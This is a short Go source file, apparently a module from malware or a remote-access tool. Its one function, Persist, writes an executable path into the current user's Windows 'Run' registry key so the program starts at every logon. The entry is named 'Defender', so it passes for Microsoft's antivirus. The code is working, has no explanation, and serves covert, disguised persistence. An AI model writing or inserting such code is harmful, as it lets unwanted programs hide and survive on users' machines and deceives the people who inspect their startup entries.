package reg

import (
	"golang.org/x/sys/windows/registry"
)

func Persist(path string) error {
	k1, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err != nil {
		return err
	}

	defer k1.Close()

	err = k1.SetStringValue("Defender", path)
	if err != nil {
		return err
	}

	return nil
}
